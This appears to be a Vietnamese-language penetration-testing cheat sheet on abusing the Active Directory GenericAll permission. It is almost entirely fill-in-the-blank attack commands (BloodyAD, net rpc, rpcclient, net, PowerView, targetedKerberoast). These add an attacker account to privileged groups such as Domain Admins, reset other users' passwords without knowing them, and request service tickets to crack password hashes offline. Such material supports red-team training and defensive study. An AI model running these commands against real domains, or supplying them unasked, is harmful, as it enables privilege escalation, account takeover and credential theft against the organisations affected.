# GenericAll

## GenericAl đối với Group

### Thao túng tài khoản (T1098)

**BloodyAD (Linux)**

Sử dụng BloodyAD để thêm người dùng vào nhóm đặc quyền.

{% code overflow="wrap" %}

```bash
bloodyAD --host "<dc_ip>" -d "<domain>" -u "<attacker_user>" -p "<attacker_password>" add groupMember "<target_group>" "<attacker_user>"
```

{% endcode %}

**Samba (Linux)**

Thêm người dùng vào nhóm đặc quyền (như Domain Admins) sử dụng Samba.

{% code overflow="wrap" %}

```bash
net rpc group addmem "<target_group>" <attacker_user> -U <domain>/<attacker_user>%<attacker_password> -S <dc_ip>
```

{% endcode %}

**Net Utility (Windows)**

Sử dụng lệnh net trên Windows để thêm người dùng vào nhóm đặc quyền.

```powershell
net group "<target_group>" <attacker_user> /add /domain
```

## GenericAll đối với User

### Đổi mật khẩu

**BloodyAD (Linux)**

Đặt lại mật khẩu của tài khoản mục tiêu mà không cần biết mật khẩu hiện tại.

{% code overflow="wrap" %}

```bash
bloodyAD --host "<dc_ip>" -d "<domain>" -u "<attacker_user>" -p "<attacker_password>" set password "<target_user>" "<new_password>"
```

{% endcode %}

#### Net RPC – **Samba (Linux)**

Đặt lại mật khẩu của tài khoản mục tiêu mà không cần biết mật khẩu hiện tại.

{% code overflow="wrap" %}

```bash
net rpc user <target_user> <new_password> -U <domain>/<attacker_user>%<attacker_password> -S <dc_ip>
```

{% endcode %}

**Rpcclient (Linux)**

Đặt lại mật khẩu của tài khoản mục tiêu mà không cần biết mật khẩu hiện tại.

{% code overflow="wrap" %}

```bash
rpcclient -U "<domain>/<attacker_user>%<attacker_password>" <dc_ip> -c "setuserinfo2 <target_user> 24 '<new_password>'"
```

{% endcode %}

**Net Utility (Windows)**

Đặt lại mật khẩu của tài khoản mục tiêu mà không cần biết mật khẩu hiện tại

```powershell
net user <target_user> <new_password> /domain
```

**PowerView (Windows)**

Đặt lại mật khẩu của tài khoản mục tiêu mà không cần biết mật khẩu hiện tại.

{% code overflow="wrap" %}

```powershell
$SecPassword = ConvertTo-SecureString '<attacker_password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<attacker_user>', $SecPassword)
Set-DomainUserPassword -Identity '<target_user>' -AccountPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force) -Credential $Cred
```

{% endcode %}

### Kerberoasting

**TargetedKerberoast (Linux)**

Yêu cầu vé TGS từ tài khoản dịch vụ, trích xuất hash mật khẩu để bẻ khóa ngoại tuyến.

{% code overflow="wrap" %}

```bash
python3 targetedKerberoast.py -u <attacker_user> -p '<attacker_password>' -d <domain> --dc-ip <dc_ip>
```

{% endcode %}

#### **PowerView (Windows)**

Yêu cầu vé TGS từ tài khoản dịch vụ, trích xuất hash mật khẩu để bẻ khóa ngoại tuyến.

{% code overflow="wrap" %}

```powershell
$SecPassword = ConvertTo-SecureString '<attacker_password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<attacker_user>', $SecPassword)
Request-SPNTicket -Identity '<target_service_account>' -Credential $Cred
```

{% endcode %}
